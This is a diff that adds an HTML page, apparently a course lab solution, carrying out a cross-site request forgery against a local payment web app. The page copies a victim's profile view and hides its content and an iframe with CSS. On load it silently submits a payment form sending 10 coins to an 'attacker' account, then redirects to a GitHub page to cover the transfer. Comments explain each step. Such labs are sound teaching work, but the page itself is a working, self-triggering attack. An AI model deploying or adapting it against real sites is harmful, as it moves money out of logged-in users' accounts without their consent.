@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+
+<!--
+making all div tags and contents hidden and making our iframe hidden
+-->
+<style>
+div {
+  visibility: hidden;
+}
+iframe {
+  visibility: hidden;
+}
+</style>
+
+<head>
+    <title>Profile</title>
+    <link rel="stylesheet" type="text/css" href="/static/style.css" />
+</head>
+
+<body>
+
+  <div class="navbar">
+    <div>Logged in as: <strong>victim</strong></div>
+    <div>
+      <form class="navbar-logout-button" action="/logout" method="post">
+        <input type="submit" value="Logout"/>
+      </form>
+      <a href="/profile/victim" ><button>Profile</button></a>
+    </div>
+  </div>
+
+  <div class="error"><p></p></div>
+
+
+<div class="profile-container">
+  <h1 class="profile-header">victim</h1>
+  <div>
+    <strong>Coins:</strong> 100
+    <br>
+    <strong>About Me:</strong><br>
+  </div>
+</div>
+
+<!--
+adding in an iframe so that our browser will not redirect
+-->
+<iframe name="myFrame" id="frame1"> </iframe>
+<p id="demo"></p>
+
+
+<div class="payment-form">
+  <h3 class="payment-header">Make payment?</h3>
+  <!--
+  making it so that our paying form runs inside of the iframe so that our
+  browser does not redirect
+  -->
+  <form name="pay_form" action="http://localhost:8080/pay" method="post", target="myFrame">
+    <div class="form-group">
+      <div class="form-label">To:</div>
+      <!--
+      recipient is attacker
+      -->
+      <div class="form-input"><input name="recipient" type="text" value = "attacker" /></div>
+    </div>
+    <div class="form-group">
+      <div class="form-label">Amount:</div>
+      <!--
+      number of coins to be paid is 10
+      -->
+      <div class="form-input"><input name="amount" type="number" value = "10"/></div>
+    </div>
+    <input class="form-button" type="submit" value="Pay"/>
+  </form>
+
+
+</div>
+
+<div class="aboutme-form">
+  <h3 class="aboutme-header">Update profile?</h3>
+  <form action="/aboutme" method="post">
+    <div class="form-group">
+      <div class="form-input"><input name="aboutme" type="text" /></div>
+    </div>
+    <input class=ss"form-button" type="submit" value="Update"/>
+  </form>
+</div>
+
+<!--
+adding an event listener inside of our iframe. Our blank screen is maintaind
+and once the payment is complete in the iframe, then the browser will redirect
+to https://github.com/tomrist/cs5435-fall2019
+-->
+<script>
+document.getElementById("frame1").addEventListener('load', myFunction, true);
+
+function myFunction() {
+  location.replace("https://github.com/tomrist/cs5435-fall2019")
+}
+</script>
+
+<!--
+making it so that our attack/payment occurs as soon as the browser is visited
+(automatically)
+-->
+<script>
+  document.forms["pay_form"].submit();
+</script>
+
+
+</body>
+
+</html>
